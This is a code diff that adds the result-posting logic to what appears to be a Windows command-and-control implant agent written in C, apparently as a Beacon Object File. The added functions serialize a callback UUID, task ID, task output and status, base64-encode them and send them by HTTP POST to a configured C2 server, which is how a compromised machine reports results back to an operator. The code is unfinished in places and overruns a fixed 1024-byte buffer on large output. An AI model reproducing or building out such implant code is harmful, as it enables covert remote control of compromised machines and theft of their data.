@@ -1,5 +1,6 @@
 #include <windows.h>
 #include "headers/celebi.h"
+#include "headers/tcg.h"
 #include "headers/HTTP.h"
 
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
@@ -252,3 +253,104 @@ void perform_tasking(AgentState *state, TaskingReply *reply) {
  * POST LOGIC
  *
 */
+
+char *generate_post_message(TaskPostRequest *post) {
+	// Allocate space and construct the serialized post_response message.
+	
+	int len = 1024;
+	int offset = 0;
+	
+	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	
+	// Prepend the Callback UUID (36 bytes).
+	for (int i = 0; i < 36; i++) {
+		msg[offset] = post->callback_uuid[i];
+		offset++;
+	}
+	
+	// 1 byte for the message type.
+	msg[offset] = MESSAGE_TYPE_POST;
+	offset += 1;
+
+	// Task ID field.
+	if (post->task_id != 0) {
+		int id_len = MSVCRT$strlen(post->task_id);
+		for (int i = 0; i < id_len; i++) {
+			msg[offset] = post->task_id[i];
+			offset++;
+		}
+	}
+	
+	// Add the null byte.
+	msg[offset] = 0;
+	offset++;
+	
+	// Task output field.
+	if (post->task_output != 0) {
+		int out_len = MSVCRT$strlen(post->task_output);
+		for (int i = 0; i < out_len; i++) {
+			msg[offset] = post->task_output[i];
+			offset++;
+		}
+	}
+	
+	// Add the null byte.
+	msg[offset] = 0;
+	offset++;
+	
+	// Task status field.
+	if (post->task_status != 0) {
+		int status_len = MSVCRT$strlen(post->task_status);
+		for (int i = 0; i < status_len; i++) {
+			msg[offset] = post->task_status[i];
+			offset++;
+		}
+	}
+	
+	// Add the null byte.
+	msg[offset] = 0;
+	offset++;
+	
+	// Base64-encode the serialized message.
+	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	base64_encode(msg, offset, encoded_msg);
+	
+	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+	return encoded_msg;
+}
+
+void free_post_request(TaskPostRequest *request) {
+	if (request->callback_uuid != NULL) { KERNEL32$VirtualFree(request->callback_uuid, 0, MEM_RELEASE); }
+	if (request->task_id != NULL) { KERNEL32$VirtualFree(request->task_id, 0, MEM_RELEASE); }
+	if (request->task_output != NULL) { KERNEL32$VirtualFree(request->task_output, 0, MEM_RELEASE); }
+	if (request->task_status != NULL) { KERNEL32$VirtualFree(request->task_status, 0, MEM_RELEASE); }
+}
+
+void perform_post(AgentState *state, TaskInfo *task, char *output, char *status) {
+	// Generate post payload.
+	TaskPostRequest post = { 0 };
+	post.callback_uuid = clone_str(state->params.callback_uuid);
+	post.task_id = clone_str(task->id);
+	post.task_output = output;
+	post.task_status = status;
+	char *msg = generate_post_message(&post);
+	
+	// Send post payload to C2 server.
+	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
+	HttpBody body = {msg, MSVCRT$strlen(msg)};
+	HttpResponse response = {0};
+	
+	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
+	
+	// If we get a 200 response code, parse the reply.
+	if (response.status_code == 200) {
+		// TODO parse reply
+		dprintf("GOT REPLY TO POST"); // DELETE ME TODO
+	}
+	
+	// Free unneeded allocations.
+	free_post_request(&post);
+	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
+}
